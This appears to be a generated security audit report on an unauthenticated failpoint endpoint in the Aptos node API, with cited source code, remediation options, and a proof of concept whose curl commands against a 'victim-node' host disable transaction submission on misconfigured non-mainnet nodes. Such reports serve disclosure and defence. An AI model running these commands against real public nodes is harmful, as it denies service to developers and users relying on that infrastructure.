# Audit Report

## Title
Unauthenticated Failpoint Injection Enables API Denial of Service on Public Non-Mainnet Nodes

## Summary
The `/v1/set_failpoint` API endpoint lacks authentication and can be abused by unauthenticated attackers to trigger failpoints in the `submit_transaction()` function, causing complete denial of service of transaction submission on public testnet/devnet nodes that have failpoints enabled.

## Finding Description

The Aptos API exposes a failpoint injection endpoint at `/v1/set_failpoint` that is unconditionally registered in the API routes, regardless of whether failpoints are compiled in or enabled. [1](#0-0) 

When the `failpoints` feature is compiled in and `api.failpoints_enabled` is set to true in the node configuration, this endpoint becomes active. However, it performs no authentication checks - only verifying that failpoints are enabled in the configuration: [2](#0-1) 

The `submit_transaction()` endpoint contains a failpoint check at the very beginning of request processing: [3](#0-2) 

An attacker can exploit this by:
1. Discovering a public testnet/devnet node with failpoints enabled
2. Calling `GET /v1/set_failpoint?name=api::endpoint_submit_transaction&actions=return`
3. All subsequent transaction submissions immediately fail with internal errors

While the config sanitizer prevents failpoints from being enabled on mainnet: [4](#0-3) 

And again in the API config: [5](#0-4) 

The sanitizer **only blocks mainnet** - it explicitly allows failpoints on testnet, devnet, and other non-mainnet chains. This creates a vulnerability window for public infrastructure nodes on these networks.

## Impact Explanation

This vulnerability qualifies as **High Severity** under the Aptos bug bounty program's "API crashes" category. 

**Affected Systems:**
- Public testnet/devnet RPC nodes operated by Aptos Labs or ecosystem partners
- Any public-facing node built with the `failpoints` feature and misconfigured with `failpoints_enabled: true`

**Attack Impact:**
- Complete denial of service for transaction submission API
- No transactions can be submitted through the affected node
- Users/dApps relying on the node experience service disruption
- Attack persists until node restart or failpoint is cleared

**Scope:**
While mainnet production nodes are properly protected, public testnet and devnet infrastructure serves as critical testing infrastructure for the ecosystem. Disrupting these services impacts developer productivity and ecosystem testing.

## Likelihood Explanation

**Likelihood: Medium-Low**

**Requirements for exploitation:**
1. Target node must be built with `failpoints` feature (not in default builds)
2. Node configuration must have `failpoints_enabled: true` (defaults to false)
3. Node must be publicly accessible

**Realistic scenarios:**
- Node operators debugging issues on public testnet might temporarily enable failpoints
- Development/staging nodes accidentally exposed publicly with debug features enabled
- CI/CD pipelines that deploy failpoint-enabled builds to public endpoints

While this requires specific misconfiguration, the complete lack of authentication makes exploitation trivial once a vulnerable target is found. An attacker can easily scan public RPC endpoints for the `/v1/set_failpoint` endpoint to identify vulnerable nodes.

## Recommendation

**Immediate Fix:** Add authentication to the failpoint endpoint or bind it to localhost only.

**Option 1 - Restrict to localhost:**
```rust
// In api/src/runtime.rs, only register endpoint for localhost connections
.at(
    "/set_failpoint",
    poem::get(set_failpoints::set_failpoint_poem)
        .data(context.clone())
        .with(RequireLocalhost::new()),  // Add localhost-only middleware
)
```

**Option 2 - Require authentication token:**
```rust
// In api/src/set_failpoints.rs
#[cfg(feature = "failpoints")]
#[handler]
pub fn set_failpoint_poem(
    context: Data<&std::sync::Arc<Context>>,
    Query(failpoint_conf): Query<FailpointConf>,
    auth_token: Header<String>,  // Require auth token from config
) -> poem::Result<String> {
    if context.failpoints_enabled() {
        // Verify auth token matches configured value
        if auth_token.0 != context.node_config.api.failpoint_auth_token {
            return Err(poem::Error::from(anyhow::anyhow!("Unauthorized")));
        }
        // ... rest of implementation
    }
}
```

**Option 3 - Extend sanitizer (Defense in depth):**
```rust
// In config/src/config/config_sanitizer.rs
// Block failpoints on ANY public-facing node, not just mainnet
if failpoints_enabled && is_public_node {
    return Err(Error::ConfigSanitizerFailed(
        sanitizer_name,
        "Failpoints cannot be enabled on public nodes!".into(),
    ));
}
```

## Proof of Concept

**Setup vulnerable node:**
```bash
# Build with failpoints feature
cargo build --release --features failpoints

# Create config with failpoints enabled
cat > test_config.yaml <<EOF
api:
  enabled: true
  address: "0.0.0.0:8080"
  failpoints_enabled: true
EOF

# Start node
./target/release/aptos-node -f test_config.yaml
```

**Exploit:**
```bash
# Set failpoint to cause submit_transaction to fail
curl "http://victim-node:8080/v1/set_failpoint?name=api::endpoint_submit_transaction&actions=return"

# All transaction submissions now fail:
curl -X POST "http://victim-node:8080/v1/transactions" \
  -H "Content-Type: application/json" \
  -d '{"sender":"0x1","sequence_number":"0",...}'
# Returns 500 Internal Server Error: "Failpoint unexpected internal error for endpoint_submit_transaction"
```

**Impact verification:**
```bash
# Confirm DoS - all submits fail until restart
for i in {1..10}; do
  curl -X POST "http://victim-node:8080/v1/transactions" -H "Content-Type: application/json" -d '{...}'
done
# All requests return failpoint errors
```

**Notes:**
- This PoC demonstrates the attack against a test node
- Real-world exploitation requires finding a public node with failpoints misconfigured
- The sanitizer prevents this on mainnet, limiting scope to testnet/devnet infrastructure

### Citations

**File:** api/src/runtime.rs (L248-251)
```rust
                    .at(
                        "/set_failpoint",
                        poem::get(set_failpoints::set_failpoint_poem).data(context.clone()),
                    ),
```

**File:** api/src/set_failpoints.rs (L21-40)
```rust
#[cfg(feature = "failpoints")]
#[handler]
pub fn set_failpoint_poem(
    context: Data<&std::sync::Arc<Context>>,
    Query(failpoint_conf): Query<FailpointConf>,
) -> poem::Result<String> {
    if context.failpoints_enabled() {
        fail::cfg(&failpoint_conf.name, &failpoint_conf.actions)
            .map_err(|e| poem::Error::from(anyhow::anyhow!(e)))?;
        info!(
            "Configured failpoint {} to {}",
            failpoint_conf.name, failpoint_conf.actions
        );
        Ok(format!("Set failpoint {}", failpoint_conf.name))
    } else {
        Err(poem::Error::from(anyhow::anyhow!(
            "Failpoints are not enabled at a config level"
        )))
    }
}
```

**File:** api/src/transactions.rs (L489-489)
```rust
        fail_point_poem("endpoint_submit_transaction")?;
```

**File:** config/src/config/config_sanitizer.rs (L82-91)
```rust
    // Verify that failpoints are not enabled in mainnet
    let failpoints_enabled = are_failpoints_enabled();
    if let Some(chain_id) = chain_id {
        if chain_id.is_mainnet() && failpoints_enabled {
            return Err(Error::ConfigSanitizerFailed(
                sanitizer_name,
                "Failpoints are not supported on mainnet nodes!".into(),
            ));
        }
    }
```

**File:** config/src/config/api_config.rs (L177-185)
```rust
        // Verify that failpoints are not enabled in mainnet
        if let Some(chain_id) = chain_id {
            if chain_id.is_mainnet() && api_config.failpoints_enabled {
                return Err(Error::ConfigSanitizerFailed(
                    sanitizer_name,
                    "Failpoints are not supported on mainnet nodes!".into(),
                ));
            }
        }
```
